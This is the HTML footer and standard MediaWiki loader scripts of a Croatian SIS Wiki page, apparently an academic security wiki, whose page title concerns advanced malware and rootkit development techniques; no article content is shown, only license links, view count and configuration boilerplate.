																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 00:49, 7. siječnja 2012.</li>
																							<li id="footer-info-viewcount">Ova stranica je pogledana 12.028 puta.</li>
																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
															</ul>
															<ul id="footer-places">
																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
																							<li id="footer-places-about"><a href="../SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
															</ul>
											<ul id="footer-icons" class="noprint">
					<li id="footer-copyrightico">
						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
					</li>
					<li id="footer-poweredbyico">
						<a href="http://www.mediawiki.org/"><img src="../../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
					</li>
				</ul>
						<div style="clear:both"></div>
		</div>
		<!-- /footer -->
		
<script src="../../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita", "wgTitle": "Razvoj naprednih tehnika za izradu malwarea/rootkita", "wgAction": "view", "wgArticleId": 23, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 5691, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script>		<!-- fixalpha -->
		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
		<!-- /fixalpha -->
		<!-- Served in 0.903 secs. -->			</body>
</html>
